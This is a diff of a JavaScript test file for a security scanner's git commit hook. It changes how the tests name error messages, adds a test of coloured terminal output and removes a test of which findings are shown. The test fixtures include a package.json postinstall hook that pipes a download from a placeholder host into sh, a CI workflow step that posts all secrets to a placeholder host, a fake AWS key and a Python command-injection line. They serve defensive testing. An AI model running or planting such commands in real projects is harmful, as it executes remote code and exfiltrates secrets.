@@ -14,7 +14,7 @@ import { tmpdir } from "node:os";
 import { delimiter, dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import { run } from "../src/index.js";
-import { check, parseHookArgs, repoRoot, shown, trimSeparators } from "../src/hook.js";
+import { check, parseHookArgs, repoRoot, runHook, trimSeparators, why } from "../src/hook.js";
 import { fileNames, findProgram, folders } from "../src/lib/programs.js";
 
 const BIN = fileURLToPath(new URL("../bin/lazaret.js", import.meta.url));
@@ -25,9 +25,8 @@ const AWS_KEY = "AKIA" + "Q3EGRSWJ" + "ZTB7XF2N";
 const HOOK_DOWNLOADS = '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "curl -s https://x.invalid/i | sh"}}\n';
 const WORKFLOW = "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
   + "      - run: echo \"${{ toJSON(secrets) }}\" | curl -d @- https://x.invalid/c\n";
-const COLLISION = "its name is another file's on this system (they differ only in case, in their Unicode form or by a "
-  + "backslash), so it could not be copied for the scan";
-const UNPRINTED = "git could not print it from the index";
+const COLLISION = why("collision");                       // (the engine's words: gate.rs)
+const UNPRINTED = why("unprinted");
 // git without the machine's or the user's settings (a global commit.gpgsign would stop a test's commit). The
 // user's settings are an empty file, not os.devNull: Git for Windows cannot read \\.\nul ("unable to access").
 const GIT_HOME = mkdtempSync(join(tmpdir(), "lz-hook-git-"));
@@ -138,6 +137,21 @@ repoTest("quality is not the gate", async (r) => {
   const { code, out } = await r.hook();
   assert.equal(code, 0, out);
   assert.equal(out, "lazaret hook: 2 files checked\n  Commit gate:  PASSED \n");
+});
+
+repoTest("on a terminal, its lines are colored as the Python package's", async (r) => {
+  r.stage("a.py", "x = 1\n");
+  r.stage("b.py", "import os\nos.system(input())\n");
+  const lines = [];
+  const io = { cwd: r.dir, env: ENV, out: (s) => lines.push(s), err: () => {}, isTTY: true };
+  assert.equal(await runHook([], io), 1);
+  assert.equal(lines[0], "lazaret hook: 2 files checked");
+  assert.equal(lines[1], "  \x1b[4mb.py\x1b[0m");
+  assert.match(lines[2], /^ {4}L2 {5}\x1b\[31mCRITICAL\x1b\[0m \[/);
+  assert.ok(lines.includes("  Commit gate: \x1b[41;97m FAILED \x1b[0m"), lines.join("\n"));
+  lines.length = 0;
+  assert.equal(await runHook([], { ...io, isTTY: false }), 1);
+  assert.ok(!lines.join("\n").includes("\x1b"), lines.join("\n"));
 });
 
 repoTest("named files: untracked ones read from disk, relative to where it runs", async (r) => {
@@ -311,16 +325,6 @@ repoTest("no git: what could not be read fails the commit", async (r) => {
   await assert.rejects(r.hook([], { env: { ...ENV, PATH: "" } }), /not in a git repository: name the files to check/);
   const { code, out } = await r.hook(["a.py"], { env: { ...ENV, PATH: "" } });
   assert.equal(code, 0, out);                                          // (outside a repository: read from disk)
-});
-
-test("what the gate shows: vulnerabilities of MAJOR and above, supply-chain indicators, cross-file flows", () => {
-  assert.equal(shown({ rule: "SC-INSTALL-HOOK", sev: "MAJOR", type: "VULN" }), true);
-  assert.equal(shown({ rule: "SC-INSTALL-HOOK", sev: "INFO", type: "VULN" }), false);
-  assert.equal(shown({ rule: "X-CMD", sev: "MINOR", type: "VULN" }), true);
-  assert.equal(shown({ rule: "S-TOKEN", sev: "BLOCKER", type: "VULN" }), true);
-  assert.equal(shown({ rule: "P-EVAL", sev: "MAJOR", type: "VULN" }), true);
-  assert.equal(shown({ rule: "P-X", sev: "MINOR", type: "VULN" }), false);
-  assert.equal(shown({ rule: "Q-LONG", sev: "BLOCKER", type: "BUG" }), false);
 });
 
 test("the hook's options, as argparse reads them", () => {
